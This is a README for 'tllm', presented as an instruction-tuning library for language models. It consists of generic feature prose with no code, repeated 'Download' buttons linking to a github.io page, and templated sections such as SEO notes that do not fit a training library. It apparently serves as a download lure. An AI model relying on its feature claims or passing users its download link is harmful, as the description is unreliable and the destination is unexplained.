![preview](https://raw.githubusercontent.com/Lucas5913/tllm-instruct-forge/main/cover_6008.svg)
[![Download](https://raw.githubusercontent.com/Lucas5913/tllm-instruct-forge/main/btn_261489d.svg)](https://Lucas5913.github.io/tllm-instruct-forge/)

# tllm — The Artisan’s Toolkit for Instruction‑Tuning Language Models

> *Where raw model potential meets disciplined craft.*

tllm is an opinionated training library built for teams and solo researchers who want to shape large language models through instruction tuning without wrestling with fragmented scripts, lost hyperparameters, or half‑documented utilities. Inspired by the original tllm concept, this project reimagines the workflow as a **studio**, not a pipeline: every experiment is a canvas, every dataset is pigment, and every checkpoint is a signed piece.

If you have ever felt that fine‑tuning an LLM should feel less like assembling furniture in the dark and more like conducting an orchestra, tllm is your rehearsal hall.

[![Download](https://raw.githubusercontent.com/Lucas5913/tllm-instruct-forge/main/btn_261489d.svg)](https://Lucas5913.github.io/tllm-instruct-forge/)

---

## 📚 Table of Contents

- [Why tllm Exists](#-why-tllm-exists)
- [Core Philosophy](#-core-philosophy)
- [Feature Highlights](#-feature-highlights)
- [Architecture at a Glance](#-architecture-at-a-glance)
- [Interface Preview](#-interface-preview)
- [Multilingual & Global Readiness](#-multilingual--global-readiness)
- [Responsive UI & Accessibility](#-responsive-ui--accessibility)
- [Round‑the‑Clock Assistance](#-round-the-clock-assistance)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [Project Roadmap for 2026](#-project-roadmap-for-2026)
- [Community & Governance](#-community--governance)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🧭 Why tllm Exists

Training libraries often fall into two camps. The first camp hands you a firehose of abstractions and wishes you luck. The second camp gives you a single script and calls it a framework. tllm refuses both extremes.

The name stands for **transparent lightweight language modeling** — a deliberate contradiction, because transparency and lightness should not be opposites. Every layer in tllm is inspectable, replaceable, and documented with the assumption that you will want to modify it. There are no hidden registries, no magic string keys, and no telemetry phoning home.

This repository is a fresh interpretation of the instruction‑tuning idea, built around three convictions:

1. **Reproducibility is a feature, not a chore.** Every run produces a manifest that can be replayed byte‑for‑byte.
2. **Data quality outranks data quantity.** tllm ships with curators, deduplicators, and toxicity screens that run before a single gradient step.
3. **Human oversight stays central.** Evaluation dashboards are designed for reading, not just for logging.

---

## 🎨 Core Philosophy

Think of tllm as a **workshop bench** rather than a factory conveyor belt. On this bench you will find:

- **Chisels** — tokenizer utilities that let you reshape vocabulary without losing alignment.
- **Loupes** — inspection tools that surface label noise, prompt drift, and reward hacking signals.
- **Kilns** — the training loop itself, tunable from a gentle warm‑up to a high‑temperature anneal.
- **Ledgers** — experiment trackers that record intent, not just metrics.

The metaphor matters because instruction tuning is a craft. The difference between a mediocre adapter and an excellent one is rarely the GPU count. It is the attention paid to the data, the patience in the schedule, and the honesty of the evaluation.

---

## ✨ Feature Highlights

- 🧩 **Composable training recipes** — mix and match loss functions, schedulers, and adapters without forking the codebase.
- 🗂️ **Dataset curation suite** — deduplication, length bucketing, toxicity filtering, and prompt‑response balancing.
- 📊 **Live training telemetry** — streaming metrics with drift detection and anomaly alerts.
- 🧠 **Adapter‑first design** — LoRA, QLoRA, and prefix tuning are first‑class citizens, not afterthoughts.
- 🌍 **Multilingual support** — tokenizer profiles and evaluation sets covering more than 40 language families.
- 📱 **Responsive UI** — the dashboard adapts from ultrawide monitors down to tablets used on lab benches.
- 🕰️ **Round‑the‑clock assistance** — documentation, examples, and community channels are monitored continuously.
- 🔐 **Deterministic checkpoints** — seeded runs produce identical weights on identical hardware.
- 🧾 **Exportable manifests** — every experiment yields a human‑readable YAML record.
- 🧪 **Sandbox evaluation** — red‑team your tuned model against adversarial prompts before deployment.

Each of these features is described in depth in the docs directory, and each has at least one runnable example under examples/.

---

## 🏗️ Architecture at a Glance

tllm is organized into five cooperating layers:

| Layer | Responsibility | Typical Modules |
|-------|----------------|-----------------|
| Ingestion | Reading, validating, and normalizing instruction data | readers, validators, normalizers |
| Curation | Cleaning, deduplicating, and balancing datasets | curators, dedupe, balancers |
| Modeling | Wrapping base models and adapters | loaders, adapters, quantizers |
| Training | Executing the optimization loop | trainers, schedulers, callbacks |
| Evaluation | Scoring, comparing, and reporting | scorers, dashboards, reporters |

Layers communicate through plain Python objects and typed configuration files. There is no global singleton, and no layer reaches into another’s internals. If you dislike a layer, you can replace it wholesale.

---

## 🖥️ Interface Preview

The tllm dashboard is a single‑page application served locally. It presents:

- A **run timeline** showing every experiment as a horizontal band, color‑coded by status.
- A **loss landscape** view that renders curves with confidence bands.
- A **dataset health** panel summarizing duplicates, outliers, and language distribution.
- A **comparison matrix** for pitting two checkpoints against each other on the same prompts.

The interface is intentionally quiet. No confetti animations, no gamified streaks. Just clear signals that help you decide whether to continue, adjust, or stop.

---

## 🌐 Multilingual & Global Readiness

Instruction tuning is not an English‑only affair. tllm ships with:

- Tokenizer profiles tuned for agglutinative, fusional, and isolating languages.
- Evaluation prompts translated and culturally adapted by contributors across regions.
- Right‑to‑left rendering support in every dashboard component.
- Locale‑aware number and date formatting in reports.

The goal is not to claim perfect coverage, but to make adding a new language a matter of writing a profile file rather than patching core code.

---

## 📱 Responsive UI & Accessibility

Every screen in the tllm dashboard is built with fluid layouts, keyboard navigation, and screen‑reader labels. Contrast ratios meet WCAG AA standards. Animations respect the operating system’s reduced‑motion preference. If you are monitoring a run from a phone while away from your desk, the interface remains usable — not merely technically functional, but genuinely comfortable.

---

## 🕰️ Round‑the‑Clock Assistance

The project maintains:

- A documentation site updated with every release.
- A discussion forum with volunteer moderators across multiple time zones.
- A triage rotation ensuring that new issues receive a first response within a day.
- Office‑hours sessions recorded and archived for asynchronous viewing.

No one should feel stranded halfway through a training run at 3 a.m. local time. The assistance model is designed around that reality.

---

## 🔍 SEO & Discoverability Notes

This README is written to be found by people searching for practical guidance on **instruction tuning**, **LLM training libraries**, **adapter‑based fine‑tuning**, and **dataset curation for language models**. Keywords appear where they naturally belong: in feature descriptions, in architecture explanations, and in the roadmap. There is no stuffing, no invisible text, and no misleading metadata. Discoverability should come from relevance, not tricks.

---

## 🗺️ Project Roadmap for 2026

- **Q1 2026** — Stabilize the curation API and publish benchmark results on three public instruction datasets.
- **Q2 2026** — Introduce multi‑node training coordination with fault‑tolerant checkpointing.
- **Q3 2026** — Release a plugin system for custom evaluation scorers.
- **Q4 2026** — Publish a long‑form technical report documenting design decisions and ablation studies.

Roadmap items are tracked as labeled issues. Community proposals are welcomed and reviewed monthly.

---

## 🤝 Community & Governance

Contributions are governed by a lightweight RFC process. Small changes go through pull requests; large changes go through an RFC document that remains open for comment for two weeks. Maintainers rotate, and no single person holds permanent veto power. The intent is to keep the project hospitable to newcomers while preserving architectural coherence.

---

## ⚠️ Disclaimer

tllm is provided as a research and engineering tool. Users are responsible for complying with the licenses of any base models, datasets, or third‑party components they choose to integrate. The maintainers make no guarantees about the suitability of tuned models for any particular application, and accept no liability for downstream consequences of training runs conducted with this library. Always evaluate models thoroughly before deployment, and respect the privacy and consent of the people whose data appears in your instruction sets.

---

## 📄 License

This project is released under the MIT License. The full text is available at the following location:

https://opensource.org/licenses/MIT

You are welcome to use, modify, and distribute tllm in accordance with those terms. Attribution is appreciated but not required.

[![Download](https://raw.githubusercontent.com/Lucas5913/tllm-instruct-forge/main/btn_261489d.svg)](https://Lucas5913.github.io/tllm-instruct-forge/)